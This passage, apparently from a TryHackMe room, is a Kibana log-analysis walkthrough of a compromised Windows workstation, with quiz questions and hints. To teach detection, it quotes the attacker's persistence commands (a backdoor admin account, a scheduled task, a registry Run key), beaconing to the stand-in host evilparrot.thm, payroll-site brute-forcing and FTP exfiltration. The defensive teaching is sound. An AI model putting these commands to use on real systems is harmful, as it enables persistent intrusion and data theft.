The syntax we can type in the "<b>Filter your data using KQL syntax</b>" search bar is the following:</p>\n\n<p><code>process.command_line: *msi*</code></p>\n\n<p>This query will match any log event where the <b>process.command_line</b> field contains the substring "<b>msi</b>." The <b>*</b> character is a wildcard that matches zero or more characters.</p>\n\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/83a70c0f7f7c4c42080baa42a746c192.png" alt="The Kibana search field, highlighting the process.command_line: *msi* KQL search query" style="width:651px;height:203.683px" /></p>\n\n<p>Once the query has been entered, press <code>Enter</code> or click "<b>Update</b>." There should be three results returned:</p>\n\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/16a6949bb96edf40f96ce5f83ab5f674.png" alt="The log events containing the PowerShell Invoke-WebRequest command and the execution of the adminshell.msi file" style="width:917.172px;height:210.834px" /><br /></p>\n\n<p>The first result appears to be using the PowerShell <b>Invoke-WebRequest</b> cmdlet again to download the malicious MSI file. The second event log seems to execute the malicious file using <b>msiexec.exe</b> - the utility used to install .msi files. To validate this, we\'ll need to expand each of these entries to view the entire <b>process.command_line </b>field.</p>\n\n<p>Executing this file likely gave the attacker an <b>elevated shell (command line) </b>on the compromised workstation. Because of this, we\'ll have to change some filters to ensure we can see those elevated log events in the next task.</p>', 'taskType': 'none', 'taskNo': 8, 'taskCreated': '2023-05-12T21:10:54.702Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'What is the name of the malicious <b>.msi</b> file?<br />', 'hint': 'Expand the event logs to see what was run. The file name was specified in the -OutFile argument of the PowerShell cmdlet.'}]}, {'taskTitle': 'Indicators of Compromise: Persistence', 'taskDesc': '<p><span style="font-size:24px">Persistence</span></p>\n\n<p>In the context of MITRE ATT&amp;CK, "<b>Persistence</b>" refers to the tactics and techniques used by adversaries to maintain long-term access to a compromised system or network, even after initial access. After achieving elevated access on a compromised system, an attacker typically looks for ways to maintain their access and gain persistence.</p>\n\n<p>Gaining persistence typically involves establishing a <b>foothold </b>or a <b>backdoor </b>on the system, often through\xa0<b>creating a new user account</b>, <b>modifying system settings</b> or files, installing a <b>rootkit</b>, or <b>scheduling a task</b>. By gaining persistence, attackers can continue exfiltrating data, spreading malware, and performing other malicious activities without detection.</p>\n\n<p>As mentioned in the previous task, the attacker likely exploited the <b>AlwaysInstallElevated </b>registry setting to achieve an elevated command shell on Bill\'s compromised workstation. Because of this, we\'ll have to change the filters we currently have set. This is because when a process runs with elevated privileges, it typically runs in the context of the "SYSTEM" user account.</p>\n\n<p>First, let\'s clear the <code>process.command_line: *msi*</code> KQL filter, as we need to expand our scope (ensure to click the green<b> Update</b> icon after clearing the search bar). Next, change the <b>related.user </b>field filter from <b>bsmith </b>to <b>SYSTEM</b>. You can do this by removing the existing filter and adding it again with <b>SYSTEM </b>as the filter this time.</p><p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/76d5d72f00254d21ae209fffe1a9aa8e.png" alt="The Kibana filter pane highlighting the removal of the related.user: bsmith filter" style="width:414px;height:98.041px" /></p>\n\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/7516ec0bbebce401532373ef276d04f3.png" alt="The Kibana filter pane highlighting the addition of the related.user: SYSTEM filter" style="width:300px;height:370.382px" /><br /></p>\n\n<p><span style="font-size:24px">Persistence: Creating Administrator Accounts<br /></span></p>\n\n<p>Briefly looking at the histogram chart at the top of our dashboard shows a small spike of activity at <b>18:54:00</b>, which is right around the time the attacker achieved elevated access. A histogram chart displays the frequency of data within each time block as a bar, with each bar representing a separate time block. Click on the time block for <b>18:54:00</b>, which will update the time filter and narrow down the results even further.</p>\n\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/2470f07c6dd8b995131f3abbcacf7226.png" alt="The histogram timeline in Kibana, highlighting the spike of events at 18:54" style="width:431.992px;height:230.688px" /><br /></p>\n\n<p>We can immediately see some <b>suspicious </b>commands being executed at <b>18:54:04</b>. The specific command is the <code>net user</code> command. The <b>net user</b> command is used in Windows to manage and <b>create user accounts</b>. The entire command run (by expanding the log event) shows that a new user account was created, the password was set never to expire, and password changes were disallowed.</p>\n\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/56aebfd27ce53dfc512b101a224f6c47.png" alt="The log events indicating the use of the net user and net localgroup commands" style="width:943.727px;height:200px" /></p>\n\n<p><code>net  user backdoor backdoor /add /expires:never /passwordchg:no</code></p>\n\n<p>The second highlighted command <code>net localgroup Administrators</code>\xa0adds the newly created user to the local <b>Administrators</b> group on the compromised system. Putting these commands together, the attacker created a new administrative user that they can use to maintain privileged access to Bill\'s workstation, even if their original method of compromise (Invoice.pdf.ps1) is discovered and removed.</p>\n\n<p><span style="font-size:24px">Persistence: Task Scheduling</span></p>\n\n<p>Let\'s continue by reverting to our original timeline to see the rest of the events. To do so, click on the <b>calendar icon</b>, and select "<b>May 11, 2023 @ 18:45:00.000 to May 11, 2023 @ 19:01:00.000</b>" under "<b>Recently used date ranges</b>":</p>\n\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/3123ca9f93363ec72d533b09ab6b7203.png" alt="The date and time selection panel in Kibana, highlighting the selection of the original 18:45 - 19:01 timeline" style="width:395.672px;height:451.187px" /><br /></p>\n\n<p>Additionally, remove the <b>related.user</b> filter as we are still interested in any processes the bsmith user executed. Then click on the next spike of records at <b>18:56:30</b> to drill into this time frame. Breaking up the logs in this way can help to improve the efficiency of log analysis by allowing you to focus on specific periods or events of interest.</p>\n\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/8e8cebba126ab241c3f23cb49f08d7f5.png" alt="The histogram timeline in Kibana, highlighting the spike of events at 18:56:30" style="width:433.575px;height:201.828px" /><br /></p>\n\n<p>Immediately, we see the use of the <b>Invoke-WebRequest</b> cmdlet that we\'re accustomed to now. The attacker appears to have downloaded a file named <code>beacon.bat</code> from the <code>http://evilparrot.thm</code> server. A <b>.bat</b> (short for "batch") file is a script file used in Windows to automate tasks. It contains a series of commands that can be executed in sequence by the command-line interpreter.</p>\n\n<p>The name "<b>beacon</b>" may refer to a\xa0<b>command and control (C2) </b>technique used by attackers to maintain persistence and communicate with a compromised system. A beacon may periodically send signals or "pings" to a C2 server to receive commands or exfiltrate data.</p>\n\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/85d6c776d57a766277e7e49bd697edcc.png" alt="The log events indicating the execution of the beacon.bat file" style="width:812.897px;height:266px" /><br /></p>\n\n<p>After several log events indicating the download, it looks like the attacker was running the <b>beacon.bat </b>file, which was immediately followed by several <b>cURL</b> commands, likely sending data or signals to the <code>http://evilparrot.thm</code> server.</p>\n\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/4b375ea0c8434ddc7b9d282a22ba8eae.png" alt="The histogram timeline in Kibana, highlighting the events at 18:57:00" style="width:310px;height:161.518px" /><br /></p>\n\n<p>Reverting to our original timeline once again and narrowing down the next time block to <b>18:57:00</b>, we see the following interesting command - the <code>schtasks</code> command.</p>\n\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/8493ea1f1ba62898c2ae8bbcb2788700.png" alt="The log event highlighting the use of the schtasks command" style="width:832.302px;height:100.484px" /></p>\n\n<p>As mentioned earlier, attackers often use <b>schtasks.exe</b> (Windows Task Scheduler) to maintain persistence on a compromised system. By creating a scheduled task that runs a malicious script or executable at a specific time or interval, an attacker can ensure that their malware or backdoor is executed automatically, even if the system is rebooted or the attacker loses initial access to the system.</p>\n\n<p>Based on the entire command below, it appears that the attacker created a new automated task called "<b>Beacon</b>," which runs the <b>beacon.bat</b> file <b>every minute</b> as the <b>System </b>(elevated administrator) user:</p>\n\n<p><code>schtasks /create /tn "Beacon" /tr "C:\\Users\\bsmith\\Desktop\\beacon.bat" /sc minute /mo 1 /ru "System"</code></p>\n\n<p><span style="font-size:24px">Persistence: Registry Editing</span></p>\n\n<p>The last persistence method we can observe is related to the <b>Windows Registry</b> again and occurs directly after the schtasks.exe event log.</p>\n\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/5159f1a54a2a13de1054433cbee116f7.png" alt="The log events highlighting the use of the reg add and reg query commands" style="width:920.954px;height:142px" /><br /></p>\n\n<p><code>reg\xa0add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "BackdoorShell" /t REG_SZ /d "C:\\Users\\bsmith\\Desktop\\adminshell.msi" /f</code></p>\n\n<p>By expanding this log event, we can quickly determine that the attacker accessed the Windows Registry and <b>added </b>(<code>reg add</code>) a new entry. The Windows registry is a central database that stores important configuration details about the operating system and its applications. By modifying the registry this way, attackers can create a persistent foothold on the system to <b>maintain access</b>, even after a reboot or system update.</p>\n\n<p>In this case, the attacker added a new entry to the "<b>Run</b>" key, which causes the <b>adminshell.msi</b> file to be executed automatically each time Bill logs in. As we recall earlier, the adminshell.msi file is a malicious file created by the attacker to spawn a remote shell with elevated permissions.</p>\n\n<p>With everything we have analyzed so far, it appears quite apparent that an attacker was able to gain an initial foothold into Bill\'s workstation, used discovery techniques to identify an avenue of privilege escalation, and made several configuration changes to create backdoors and maintain persistence on the compromised system.</p>', 'taskType': 'none', 'taskNo': 9, 'taskCreated': '2023-05-13T00:38:40.192Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'What is the <b>name </b>of the <b>user account</b>\xa0that the attacker created to maintain privileged access?<br />', 'hint': 'The syntax for this command is typically "net user [username] [password]".'}, {'questionNo': 2, 'question': '<p>What is the flag sent via <b>cURL\xa0</b>requests to the <b>evilparrot.thm</b> server?<br /></p>', 'hint': 'The flag can be found in the URL parameter of the HTTP request. The URL parameters follow the "?" character in the URL.'}, {'questionNo': 3, 'question': '<p>What is the <b>name </b>of the registry value that the attacker added?<br /></p>', 'hint': 'In the "reg add" command, the "/v" flag is used to specify the name of the registry value being added or modified.'}]}, {'taskTitle': 'Indicators of Compromise: Lateral Movement', 'taskDesc': '<p><span style="font-size:24px">Lateral Movement</span></p>\n\n<p>In the context of MITRE ATT&amp;CK, "<b>Lateral Movement</b>" refers to the techniques and methods used by adversaries to pivot through multiple systems and accounts and explore the network to gain access to their target.</p>\n\n<p>Once an attacker has gained initial access to a workstation, they may use lateral movement techniques to <b>explore the network</b> and find other systems to compromise. This may involve leveraging vulnerabilities or weaknesses in network protocols or software, using stolen credentials, passing hashes, or hijacking existing sessions to move from one system to another.</p>\n\n<p><span style="font-size:24px">Network Enumeration</span></p>\n\n<p>The first curious log entry that suggests the attacker might be preparing to move laterally can be found in the fourth log event within our current filter:</p>\n\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/db45e7c400e08b9ba456114e6fc208b9.png" alt="The log event indicating the use of the ping command" style="width:699.643px;height:72.0938px" /><br /></p>\n\n<p><code>ping payroll.servidae.internal</code></p>\n\n<p>The <b>"ping"</b> command is a standard networking tool used to test the connectivity between two devices on a network via the ICMP protocol. This does not indicate lateral movement or malicious activity; however, the larger pattern of suspicious activity we have found in the logs supports the idea that the attacker is attempting to test connectivity to other internal resources.</p>\n\n<p>Because Bill is a Finance Executive, we can infer that the <b>payroll.servidae.internal</b> website is an internal payroll tool Servidae uses. If an attacker managed to use Bill\'s compromised workstation to pivot and gain access to an internal payroll system, the consequences of<b> data exfiltration and tampering</b> could be detrimental.</p>\n\n<p><span style="font-size:24px">Lateral Movement: Internal Resources</span></p>\n\n<p>To investigate deeper, let\'s reset our time range to where it was initially but change the <b>Start date </b>to <b>May 11, 2023 @ 18:57:30.000</b>. This way, we\'ll see just the remaining logs captured.</p>\n\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/9c008ddea2aed1c6668eff2e4a8e0141.png" alt="The date and time panel in Kibana, highlighting the starting date and time of May 11, 2023 @ 18:57:30.000" style="width:454.805px;height:362px" /><br /></p>\n\n<p>Immediately after updating the timeline, we start to see several logs attempting to make <b>cURL</b> requests to the <b>payroll.servidae.internal</b> website at the <code>http://payroll.servidae.internal</code> URL:</p>\n\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/873572037c15093893bf06dfd95afcaf.png" alt="The log events indicating continuous curl commands being run against the payroll web server with incrementing password attempts" style="width:707.877px;height:262px" /><br /></p>\n\n<p>To filter out unnecessary repeating logs (<i>like the beacon cURL commands</i>), let\'s add the following <b>KQL query</b> to our results:</p>\n\n<p><code>process.name : "curl.exe" AND NOT process.command_line : *beacon*</code></p>\n\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/2ea9369882b2faf0a2c1bdaff3d60777.png" alt="The KQL search field" style="width:50%" /><br /></p>\n\n<p>Along with filtering out the results, this KQL query demonstrates that:</p>\n<ol>\n<li>We can <b>combine </b>multiple statements using <b>AND + OR</b> operators.</li>\n<li>We can use <b>wildcard </b>values "<b>*</b>" to match fields that <i>contain </i>values rather than\xa0<i>equal </i>them.</li>\n<li>We can <b>exclude </b>specific results by using "<b>NOT</b>" - in this case, we exclude any command-line result containing the word "beacon".</li>\n</ol>\n\n<p><span style="font-size:24px">Internal Server Brute-Force<br /></span></p>\n\n<p>After adding the above KQL query to our results, we now get a clearer picture of what the attacker attempted to do to access the internal payroll website. It appears that the attacker conducted a <b>brute-force login attack</b>, as the logs show a long list of <code>POST</code> requests made to the server. The request parameters indicate that the attacker is attempting to submit the login form (<code>submit=submit</code>) using the user account "bsmith" (<code>username=bsmith</code>). </p>\n\n<p>Each log event shows that the attacker is incrementing password attempts (<code>password=Pass3</code>, <code>password=Pass4</code>, <code>password=Pass5</code>, etc.), which is a clear sign of a brute-force attack.</p>\n\n<p>Fortunately, we will not have to comb through each attempt to identify if there was any successful access because we were given further information from the development team that the internal payroll website responds with a<b> session cookie</b> named "<b>PHPSESSID</b>" for any successful logins. Any subsequent request to the payroll server must <b>include </b>that cookie to remain logged in. Armed with this knowledge, we can craft a simple <b>KQL query </b>to return log events containing that cookie in the request:</p>\n\n<p><code>*PHPSESSID*</code></p>\n\n<p>Filtering with this query should return two successful logins from the attacker:</p><p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/d0c8bd23801a1fa2856eb436d3ec4b62.png" alt="The KQL search field highlighting the query of *PHPSESSID*" style="width:297px;height:124.02px" /><br /></p>\n\n<p><span style="font-size:24px">Internal Server Data Exfiltration</span></p>\n\n<p>Now that we know the attacker brute-forced their way into the internal payroll website as the Bill Smith (bsmith) user, we need to identify which <b>directories </b>or <b>files </b>they may have accessed on this web server after authenticating. </p>\n\n<p>Typically, we could leverage additional logs collected from the <b>nginx server</b>\xa0hosting the internal payroll website. This would provide us with much more detail about each HTTP request, parameter, and source; however, that approach is beyond the scope of this room, and we will stick with the workstation\'s agent log events.</p>\n\n<p>In our case, let\'s use the following <b>KQL query</b>:</p>\n\n<p><code>process.name: "curl.exe" AND NOT process.command_line: *beacon* AND process.command_line: *http\\://payroll.servidae.internal/*</code></p>\n\n<p>This is essentially the same query we used above but with an additional <b>AND </b>statement to only return log events where the attacker accessed a directory <i>under </i>the web server\'s root (using a wildcard <b>*</b> after the backslash <b>/</b>).</p>\n\n<p>This will return three relevant results. The first two results show the attacker accessing the <b>/employee-payroll.php</b> webpage, which likely contains sensitive internal information only meant for the Finance department.</p>\n\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/52900d4ae31a48281ac84d2ebaac10f8.png" alt="The log event highlighting the attacker accessing the /employee-payroll.php webpage on the payroll web server" style="width:50%" /><br /></p>\n\n<p>The final result in our logs shows that the attacker <b>downloaded </b>a potentially <b>sensitive CSV file </b>after gaining access to the payroll server. It was saved to Bill\'s desktop, which, if investigated chronologically without the current filters, is immediately followed by the "<b>FTP</b>" (<b>File Transfer Protocol</b>) command, likely to <b>exfiltrate </b>and <b>transfer </b>the stolen document back over to the attacker\'s system.</p>\n\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/3f175a051d40d040ad930a5483431d8c.png" alt="The log event highlighting the attacker downloading a file from the payroll server called bank-details.csv" style="width:884.887px;height:76.6875px" /><br /></p>\n\n<p><span style="font-size:24px">Mitigation</span></p>\n\n<p>The above analysis concludes that by gaining control over Bill\'s workstation, the attacker could further enumerate using the workstation\'s access and network to identify an internal resource vulnerable to a brute-force attack. By proxying through Bill\'s workstation, the attacker could access the internal resource and exfiltrate sensitive documents to the attacker\'s system.</p>\n\n<p>There are several defence concepts around mitigating an attacker\'s ability to move freely around the network, such as <b>network segmentation</b>, <b>strict access controls</b>, and <b><a href="https://www.microsoft.com/en-ca/security/business/zero-trust" target="_blank">Zero Trust</a> principles</b>. Traditional security models relied on the assumption that threats were external and that once inside the network, users and devices could be trusted. However, this approach has proven inadequate with increasing internal threats. "Zero Trust", on the other hand, continuously authenticates and authorizes users, devices, and applications <b>before granting access</b> to resources.</p>', 'taskType': 'none', 'taskNo': 10, 'taskCreated': '2023-05-13T00:38:54.522Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': "What was the <b>password</b> that the attacker used to access Bill's user account on the internal payroll website?<br />", 'hint': 'The PHPSESSID KQL query mentioned earlier may come in handy here.'}, {'questionNo': 2, 'question': "<p>What <b>flag </b>was included within the <b>HTTP requests</b> during the attacker's successful logins?<br /></p>", 'hint': 'Check the request parameters for the flag.'}, {'questionNo': 3, 'question': '<p>What was the <b>session cookie value</b> that the attacker included in the cURL request at <b>18:58:08.001</b>?<br /></p>', 'hint': 'PHPSESSID=*******'}, {'questionNo': 4, 'question': '<p>What is the name of the sensitive file that the attacker downloaded?<br /></p>', 'hint': ''}]}, {'taskTitle': 'Conclusion', 'taskDesc': '<p><span style="font-size:24px">Conclusion</span></p>\n\n<p>To summarize our analysis, we identified several <b>indicators of compromise</b> on Bill\'s workstation. We mapped several of these log events to common tactics and techniques conducted by threat actors. Through a comprehensive exploration of search and filter functions in Kibana, we successfully deciphered the actions performed by a malicious actor on the compromised system.</p>\n\n<p>We gained practical insights into the attacker\'s tactics and techniques and enhanced our understanding of <b>real-world cyber security incident scenarios</b>. This exercise highlighted the significance of log analysis and its role in detecting and mitigating security incidents, reinforcing the importance of continuous monitoring and analysis of log data to fortify our defences against malicious actors.</p>\n\n<p><span style="font-size:24px">Next Steps</span></p>\n\n<p>After completing the log analysis and gaining valuable insights into the actions of the malicious actor, it is essential to highlight that the analysis phase is just <b>one component</b> of the broader incident response process. Typically, the remaining incident response process involves <b>additional crucial steps</b> that are beyond the scope of this room but equally as important:</p>\n\n<ul>\n<li><b>Containment</b>: Isolating the affected system or network segment to prevent further damage.</li>\n<li><b>Eradication</b>: Removing the malicious presence from the compromised system.</li>\n<li><b>Recovery</b>: Restoring the system or network to its normal functioning state.</li>\n<li><b>Post-Incident Activity</b>: Assessing the incident, identifying root causes, documenting lessons learned, and implementing security enhancements.</li>\n</ul>\n\n<p>The <a href="https://nvlpubs.nist.gov/nistpubs/specialpublications/nist.sp.800-61r2.pdf" target="_blank">Computer Security Incident Handling Guide</a> by NIST (National Institute of Standards and Technology) is a fantastic resource for in-depth guidelines and best practices for effectively responding to computer security incidents.</p>\n\n<p><span style="font-size:24px">Further Research</span></p>\n\n<ul>\n<li><a href="https://www.elastic.co/elastic-stack/" target="_blank">elastic.co/elastic-stack</a>: The Elastic Stack\'s official website.</li>\n<li><a href="https://www.elastic.co/guide/en/ecs/current/ecs-field-reference.html" target="_blank">ECS Field Reference</a>: ECS (Elastic Common Schema) field reference guide.</li>\n<li><a href="https://attack.mitre.org/" target="_blank">attack.mitre.org</a>: The official website of the <b>MITRE ATT&amp;CK</b> framework.</li>\n</ul>', 'taskType': 'none', 'taskNo': 11, 'taskCreated': '2023-05-16T04:42:41.651Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Click and continue learning!<br />', 'hint': ''}]}]}